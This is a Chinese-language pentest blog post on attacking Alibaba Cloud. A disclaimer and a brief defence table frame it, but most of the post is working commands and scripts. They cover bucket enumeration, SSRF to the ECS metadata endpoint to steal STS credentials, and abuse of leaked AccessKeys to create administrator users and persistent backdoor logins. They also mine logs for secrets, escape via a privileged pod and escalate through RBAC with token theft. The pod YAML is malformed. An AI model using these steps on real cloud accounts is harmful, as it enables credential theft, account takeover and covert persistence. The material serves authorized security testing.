---
title: "云安全：阿里云安全测试"
date: 2025-07-26 13:19:50
tags:
  - 云安全
  - 渗透测试
description: 阿里云安全测试——OSS/ECS 元数据/RAM STS 凭据利用与 AccessKey 泄露。
categories: 渗透测试
---

## 免责声明

本文仅供安全研究与授权测试使用。文中攻击手法未经授权不得用于任何第三方系统。作者不承担因滥用本文技术而产生的法律责任。对云环境进行安全测试前，请务必获取客户书面授权。

---

## 一、引言

阿里云安全架构覆盖 OSS、ECS、RAM、SLS、ACK 等产品线。本文从攻击者视角梳理各服务的测试方法，涵盖 OSS 公开访问枚举、ECS 元数据攻击、STS 凭证利用、AK 泄露利用、控制台接管、SLS 日志挖掘、ACK 集群渗透等核心场景。

---

## 二、OSS 对象存储安全

### 2.1 Bucket 公开访问检测

OSS Bucket 访问控制分私有、公共读、公共读写三级。

```bash
# 检测访问权限
curl -I http://target.oss-cn-hangzhou.aliyuncs.com/

# 列出公共读 Bucket 对象 (HTTP 200=泄露; 403=私有; 404=不存在)
curl "http://target.oss-cn-hangzhou.aliyuncs.com/?max-keys=100"
```

### 2.2 Bucket 枚举与爆破

```python
import requests, dns.resolver

regions = ["oss-cn-hangzhou", "oss-cn-beijing", "oss-cn-shanghai", "oss-cn-shenzhen"]
prefixes = ["targetcorp-", "target-"]
wordlist = ["backup", "logs", "cdn", "upload", "assets", "config", "db-backup"]

for word in wordlist:
    for prefix in prefixes:
        host = f"{prefix}{word}.oss-cn-hangzhou.aliyuncs.com"
        try:
            dns.resolver.resolve(host, "A")
            r = requests.head(f"http://{host}", timeout=5)
            if r.status_code != 404:
                print(f"[!] {host} => {r.status_code}")
        except Exception:
            pass
```

### 2.3 敏感文件挖掘与上传绕过

```bash
# 遍历敏感路径
curl "http://target.oss-cn-hangzhou.aliyuncs.com/?prefix=.git/&max-keys=100"
curl "http://target.oss-cn-hangzhou.aliyuncs.com/?prefix=backup/&max-keys=100"
curl http://target.oss-cn-hangzhou.aliyuncs.com/.env

# PUT 上传到公共写 Bucket
curl -X PUT --data "pentest" http://public-bucket.oss-cn-hangzhou.aliyuncs.com/test.txt
```

---

## 三、ECS 元数据服务攻击 (100.100.100.200)

阿里云 ECS 元数据端点 `100.100.100.200` 仅限实例内部访问，但 SSRF 可打穿。

```bash
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/user-data
```

### 3.1 SSRF 利用获取 STS 凭证

```python
import requests
target = "http://vuln-app.com/fetch?url="
eps = ["http://100.100.100.200/latest/meta-data/ram/security-credentials/",
       "http://100.100.100.200/latest/user-data"]
for ep in eps:
    print(requests.get(f"{target}{ep}", timeout=5).text[:300])
```

获取角色名后拉取 STS 临时凭证：

```bash
ROLE=$(curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/)
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/$ROLE
# 返回 AccessKeyId, AccessKeySecret, SecurityToken, Expiration
```

### 3.2 利用 STS 凭证横向移动

```bash
aliyun configure set --profile sts --mode StsToken \
  --access-key-id STS.NTxxxx --access-key-secret yyyyyy --sts-token zzzzzz
aliyun sts GetCallerIdentity --profile sts
aliyun ecs DescribeInstances --region cn-hangzhou --profile sts
aliyun rds DescribeDBInstances --region cn-hangzhou --profile sts
aliyun oss ls --profile sts
aliyun ram ListUsers --profile sts
```

```python
from aliyunsdkcore.client import AcsClient
from aliyunsdkcore.auth.credentials import StsTokenCredential
from aliyunsdkecs.request.v20140526 import DescribeInstancesRequest

cred = StsTokenCredential("STS.NTxx", "sk", "token")
cli = AcsClient(region_id="cn-hangzhou", credential=cred)
print(cli.do_action_with_exception(DescribeInstancesRequest.DescribeInstancesRequest()))
```

---

## 四、AccessKey 泄露利用

### 4.1 泄露场景与扫描

泄露来源：GitHub 代码仓库、前端 JS、`.env` 文件、APK 反编译、CI/CD 日志、小程序源码包。

AccessKey 特征：`LTAI` + 16-20 位字母数字。

```bash
trufflehog github --repo=https://github.com/target/repo
grep -rE "LTAI[a-zA-Z0-9]{16,20}" /path/to/source/
```

```python
import re
pattern = re.compile(r'LTAI[a-zA-Z0-9]{16,20}')
def scan(filepath):
    with open(filepath, 'r', errors='ignore') as f:
        for m in pattern.findall(f.read()):
            print(f"[!] {m} => {filepath}")
```

### 4.2 AK/SK 利用与提权

```bash
aliyun configure set --profile leaked --access-key-id LTAI5txxxx --access-key-secret yyyy
aliyun sts GetCallerIdentity --profile leaked

# 尝试创建特权用户
aliyun ram CreateUser --UserName pentest --DisplayName "Test" --profile leaked
aliyun ram AttachPolicyToUser --UserName pentest \
  --PolicyName AdministratorAccess --PolicyType System --profile leaked

# 尝试 AssumeRole 提权
aliyun ram ListRoles --profile leaked
aliyun sts AssumeRole --RoleArn acs:ram::123456789012:role/admin \
  --RoleSessionName pwn --profile leaked
```

---

## 五、控制台接管

### 5.1 获取登录入口

```bash
aliyun ram GetAccountAlias --profile leaked
# 登录 URL: https://signin.aliyun.com/<alias>.onaliyun.com/login.htm

# 创建登录配置
aliyun ram CreateLoginProfile --UserName target \
  --Password "Pwn@2025!" --PasswordResetRequired false --profile leaked
```

### 5.2 STS 联合登录

```python
import urllib.parse, requests
def gen_console(ak, sk, token):
    u = ("https://signin.aliyun.com/federation?Action=GetSigninToken"
         f"&AccessKeyId={ak}&AccessKeySecret={sk}"
         f"&SecurityToken={urllib.parse.quote(token)}&TicketType=mini")
    tok = requests.get(u).json().get("SigninToken")
    if tok:
        return f"https://signin.aliyun.com/federation?Action=Login&SigninToken={tok}"
    return None
```

### 5.3 持久化后门

```bash
aliyun ram CreateUser --UserName monitor --DisplayName "Monitor" --profile sts
aliyun ram AttachPolicyToUser --UserName monitor \
  --PolicyName AdministratorAccess --PolicyType System --profile sts
aliyun ram CreateAccessKey --UserName monitor --profile sts
aliyun ram CreateLoginProfile --UserName monitor \
  --Password "Backdoor@2025!" --PasswordResetRequired false --profile sts
```

---

## 六、SLS 日志服务安全

```bash
aliyun log ListProject --profile sts
aliyun log ListLogStore --project target-project --profile sts
```

### SDK 读取日志并挖掘敏感信息

```python
from aliyun.log import LogClient
import time, re

client = LogClient("cn-hangzhou.log.aliyuncs.com", "LTAI5txx", "sk")
for p in client.list_project().get_projects():
    for ls in client.list_logstore(p.get_project_name()).get_logstores():
        try:
            logs = client.get_log_all(p.get_project_name(),
                ls.get_logstore_name(), int(time.time())-3600, int(time.time()))
            for log in logs.get_logs():
                content = str(log.get_contents())
                for pat in [r'LTAI[a-zA-Z0-9]{16,20}',
                            r'(?i)(password|pwd)\s*[:=]\s*\S+',
                            r'(?i)(token|jwt)\s*[:=]\s*\S+']:
                    m = re.findall(pat, content)
                    if m: print(f"[!] {m}")
        except Exception as e:
            pass
```

---

## 七、ACK 容器服务安全

### 7.1 获取 Kubeconfig

```bash
aliyun cs DescribeClusters --profile sts
aliyun cs DescribeClusterUserKubeconfig --ClusterId <CLUSTER_ID> --profile sts \
  | jq -r '.config' > kubeconfig.yaml
export KUBECONFIG=kubeconfig.yaml && kubectl get pods --all-namespaces
```

### 7.2 特权容器逃逸

```yaml
apiVersion: v1
kind: Pod
metadata: {name: escape}
spec:
  hostNetwork: true; hostPID: true; hostIPC: true
  containers:
    image: alpine
    securityContext: {privileged: true}
    command: ["/bin/sh","-c","sleep 3600"]
    volumeMounts:
    - mountPath: /host; name: root
  volumes:
    hostPath: {path: /, type: Directory}
```

```bash
kubectl exec -it escape -- chroot /host
cat /etc/kubernetes/manifests/kube-apiserver.yaml
cat /host/etc/kubernetes/admin.conf
```

### 7.3 RBAC 提权与 SA Token 窃取

```bash
kubectl auth can-i --list
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=default:default
kubectl get secrets --all-namespaces -o yaml | grep -E '^\s+token:'
```

### 7.4 集群内网扫描

```bash
kubectl run scan --image=nicolaka/netshoot --rm -it -- bash
# Pod 内:
nmap -p 443,6443,2379,10250 -sV 10.96.0.0/12
kubectl get endpoints -A -o jsonpath='{.items[*].subsets[*].addresses[*].ip}'|xargs nmap
```

---

## 八、其他服务速查

```bash
# 函数计算
aliyun fc ListServices --region cn-hangzhou --profile sts
aliyun fc GetFunctionCode --serviceName s --functionName f --region cn-hangzhou --profile sts

# KMS
aliyun kms ListKeys --profile sts
aliyun kms Decrypt --CiphertextBlob "<base64>" --profile sts

# API 网关
aliyun cloudapi DescribeApis --region cn-hangzhou --profile sts
```

---

## 九、防御最佳实践

| 领域 | 措施 |
|------|------|
| 凭证 | 禁用硬编码 AK，使用 RAM 角色；最小权限；启用 ActionTrail 审计 |
| OSS | 默认私有，SSE-KMS 加密，防盗链，日志监控 |
| ECS | 安全组最小开放，禁用 IMDSv1，user-data 不存放凭据 |
| ACK | RBAC 启用，Pod Security Policy 限制特权容器，NetworkPolicy 隔离 |

---

## 十、总结

典型攻击链路：

1. **信息收集** — OSS 枚举 · DNS · GitHub AK 扫描
2. **初始突破** — SSRF → `100.100.100.200` → STS / 泄露 AK
3. **提权** — AssumeRole / IAM 策略提权
4. **横移** — ECS → RDS → OSS → SLS → ACK
5. **持久化** — 后门 RAM 用户 + 控制台登录 + 特权 Pod

纵深防御与最小权限是云安全核心。每一次测试的目标是发现暴露面，帮助组织构建更健壮的防线。

> [阿里云安全白皮书](https://www.alibabacloud.com/help/zh/security/) · [CIS Alibaba Cloud Benchmark](https://www.cisecurity.org/benchmark/alibaba_cloud) · [RAM 最佳实践](https://help.aliyun.com/document_detail/ram/ram-user-guide/best-practices.html)
